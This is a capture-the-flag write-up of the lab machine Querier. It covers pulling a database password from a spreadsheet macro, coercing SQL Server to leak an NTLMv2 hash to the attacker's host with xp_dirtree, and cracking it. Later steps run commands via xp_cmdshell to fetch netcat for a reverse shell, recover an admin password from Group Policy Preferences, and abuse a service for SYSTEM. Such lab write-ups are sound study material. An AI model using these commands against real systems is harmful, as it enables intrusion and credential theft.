---
layout: post
title: "The Spreadsheet Remembered the Password"
subtitle: "HTB Querier, where a macro in a report file leaks the database, the database calls home and hands you its hash, and a six-year-old group policy file still has the admin password sitting in plain reach"
date: 2019-06-29 12:00:00 +0000
description: "A macro-enabled spreadsheet leaks a database login, the database calls back to you and gives up its hash, and an old group policy file still holds the admin password in the open."
image: /assets/og/the-spreadsheet-remembered-the-password.png
tags: [hackthebox, writeup]
---

Querier is a box about things that keep secrets long after they should have forgotten them. A report file remembers the login it was built to use. A database, asked to look at a folder, walks across the network and announces who it is to whoever is listening. And a group policy file that did its job once, years ago, still holds the administrator password in a drawer the whole company can open. Nothing here is forced. Every door swings on a secret that was written down somewhere and never wiped. You just have to be the one who reads it.

```
        Q U E R I E R
        =============
        a share, no password.  one file: a report.xlsm
                 |
        open the macro ->  "Uid=reporting; Pwd=..."
                 |
        log into the db, ask it to look at YOUR folder.
        it walks over and whispers its own name and hash.
                 |
        crack the whisper. run a command. then read an
        old policy file that still knows the admin password.
                                            憶
```

## 0x01 · the open drawer

`nmap` paints a very Windows picture. SMB on 139 and 445, RPC on 135, a Microsoft SQL Server on 1433, and WinRM up high on 5985. The SQL banner reads `14.00.1000`, which is SQL Server 2017, and the host underneath turns out to be Windows Server 2019. Modern, patched, nothing dusty. That detail matters at the end.

```
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0
```

Start where Windows always leaks first, the file shares. List them with no credentials at all.

```
$ smbclient -N -L //10.10.10.125
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk
```

`Reports` answers to nobody, which is to say it answers to everybody. Connect to it the same way, with `-N` for null auth, and there is exactly one file waiting inside.

```
$ smbclient -N //10.10.10.125/Reports
smb: \> ls
  Currency Volume Report.xlsm
smb: \> get "Currency Volume Report.xlsm"
```

A `.xlsm` is an Excel workbook with macros baked in, the `m` on the end being the tell. Macros are little programs that ride along inside the document, and programs need to be read, not double-clicked.

## 0x02 · the macro that kept the login

Opening the file in Excel would run the macro, which is the one thing you never do with an untrusted document. Instead you crack it open cold with `olevba`, a tool that rips the VBA source straight out of the file without ever executing a line of it. Think of it like reading the recipe card taped inside a microwave instead of pressing start and hoping. You see exactly what it was going to do.

```
$ olevba "Currency Volume Report.xlsm"
...
  cn.Open "Driver={SQL Server};Server=QUERIER;Database=volume;" & _
          "Uid=reporting;Pwd=PcwTWTHRwryjc$c6;"
```

There it is, sitting in the macro like a sticky note left on a monitor. The workbook was built to pull live numbers out of the company database, so somebody hardcoded the connection string right into it: server `QUERIER`, database `volume`, user `reporting`, and the password in the clear. The file was meant to be shared. The login was meant to be private. Putting one inside the other quietly merged the two.

## 0x03 · the database that walked over and introduced itself

Those credentials are low-privilege, just enough to read the `volume` database. Connect with impacket's `mssqlclient.py` and confirm.

```
$ mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
SQL (QUERIER\reporting  guest@volume)>
```

A `guest` login can barely look around, let alone run commands. But MSSQL has a generous old habit you can lean on. A stored procedure called `xp_dirtree` lists the contents of a folder, and it does not care whether that folder is on the server or across the internet. Hand it a UNC path pointing at a share on your own machine and the database server will dutifully walk over to fetch the listing.

Here is the trick. To open an SMB connection to your box, Windows first authenticates, and it does that by sending the service account's name and a hashed challenge response. Picture sending a coworker to pick up a package at your address. To prove they are allowed, they show ID at the door, and you are the one holding the door. You never needed their password. They handed you proof of who they are, unasked, just by showing up.

So you stand at the door with `Responder`, which does nothing but listen for exactly this and write down whatever introduces itself.

```
# responder -I tun0
[+] Listening for events...
```

Then from the SQL prompt, point the database at your address.

```
SQL> xp_dirtree '\\10.10.14.4\iceberg'
```

Responder catches the introduction mid-handshake.

```
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:1122...
```

The account running the database is `mssql-svc`, and you now hold its Net-NTLMv2 hash. That is not the password, it is a salted challenge response, but it cracks offline like anything else. Feed it to hashcat as mode 5600 against a wordlist.

```
$ hashcat -m 5600 mssql-svc.hash rockyou.txt
MSSQL-SVC::QUERIER:...:corporate568
```

`corporate568`. The service account just told you its secret because you asked it to look at a folder.

## 0x04 · the command line hiding in the query window

`mssql-svc` is a far stronger login than `reporting`, strong enough to flip on the feature every defender disables on purpose. `xp_cmdshell` lets the database run operating system commands as the service account, and impacket's client has a helper to enable it. Reconnect as the new identity and turn it on.

```
$ mssqlclient.py QUERIER/mssql-svc:corporate568@10.10.10.125 -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
querier\mssql-svc
```

The database is now running your commands. Drop a copy of `nc64.exe` on your SMB share, then have `xp_cmdshell` reach across, grab it, and call you back.

```
SQL> xp_cmdshell [ fetch nc64.exe from \\10.10.14.4\iceberg and reverse shell to 10.10.14.4:443 ]
```

Catch it on a listener and you are standing on the box as `mssql-svc`, holding `user.txt`.

```
$ nc -lvnp 443
querier\mssql-svc
C:\> type C:\Users\mssql-svc\Desktop\user.txt
████████████████████████████████
```

## 0x05 · the policy file with a long memory

`mssql-svc` is not admin. Enumerate with `PowerUp.ps1`, the classic Windows privilege survey, and run `Invoke-AllChecks`. It surfaces two things worth your attention.

First, the account holds `SeImpersonatePrivilege`. On most older Windows that is a straight line to SYSTEM through a potato exploit, which abuses how the system trusts certain handshakes. But this is Server 2019, and Microsoft closed that exact path here. Worth knowing the door exists even when this particular box has nailed it shut.

Second, and this is the real prize, PowerUp finds a cached group policy file.

```
[*] Checking for cached Group Policy Preferences .xml files...
   C:\ProgramData\...\Groups\Groups.xml
```

Group Policy Preferences was a feature for pushing settings, including local account passwords, out to every machine in a domain. The passwords rode along inside a `Groups.xml` file, encrypted. The catastrophe is that Microsoft published the decryption key in their own documentation, the same fixed AES key on every Windows machine on earth. An encrypted secret guarded by a key everyone already has is just a secret with extra steps. The file still sits in `History` long after the policy ran, like a shredder that quietly kept a photocopy of everything it ate.

PowerUp reads the file and undoes the encryption for you.

```
Changed   : {2019-01-28}
UserNames : {Administrator}
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
```

The local administrator password, in plain text, recovered from a file that did its job and was never cleaned up.

## 0x06 · walking in the front

You do not need a shell trick anymore, you have the administrator's password. Use it directly with impacket's `wmiexec.py`.

```
$ wmiexec.py administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
querier\administrator
C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

For completeness, the box leaves a second route to the very top. Since `mssql-svc` has `SeImpersonatePrivilege` and the potato is dead here, PowerUp offers `Invoke-ServiceAbuse`, which rewrites the command a service runs and then restarts it. The `UsoSvc` update service is editable by this account, so you point its binary at your own and let Windows launch your payload as SYSTEM.

```
PS> Invoke-ServiceAbuse -Name 'UsoSvc' -Command "[ run iceberg payload, reverse shell to 10.10.14.4:443 ]"
...
nt authority\system
```

Two ways up, one through a password the company forgot it stored, one through a service the company forgot to lock down.

## 0x07 · the honest caveat

Querier never gets exploited in the memory-corruption sense. There is no overflow, no clever shellcode, no zero-day. Every single step is a secret that outlived its purpose and a system that was too trusting to notice. The macro remembered a login because nobody asked whether a file meant for sharing should carry a private password. The database handed over its hash because `xp_dirtree` will fetch a folder from anywhere and authenticate to get there, and the service account was happy to introduce itself to a stranger. The admin password survived in `Groups.xml` because the feature that wrote it was retired but the file it left behind was not.

The group policy step is the one that should keep an administrator up at night, because it was a sanctioned Microsoft feature, used as documented, and it still scattered passwords across every machine that the whole domain could read. The fix shipped in 2014 as MS14-025, which stopped new files from being created, but it pointedly did not go back and delete the ones already on disk. Patched and still bleeding, because a patch closes the faucet and rarely mops the floor. The lesson generalizes past this box and past Windows entirely. A credential you wrote down somewhere convenient does not stop existing when you stop needing it. It just waits, in a share or a macro or a history folder, for someone patient enough to go looking. The only secret that cannot leak is the one you actually deleted.

## 0x08 · outro

```
the report remembered the login it was born with.
the database walked over and said its own name out loud.
the policy file kept the admin password like a souvenir.

nothing was broken. everything was just left lying around.
the box never picked a lock. it read the notes on the desk.

delete the secret. mind the callback. wear black.

                                                            EOF
```

---

*HTB: Querier, retired 22 Jun 2019. A medium Windows box that is really a lecture on secrets that refuse to die, wearing a spreadsheet, a database callback, and a six-year-old group policy file. The admin password was always there. Someone just had to open the drawer.*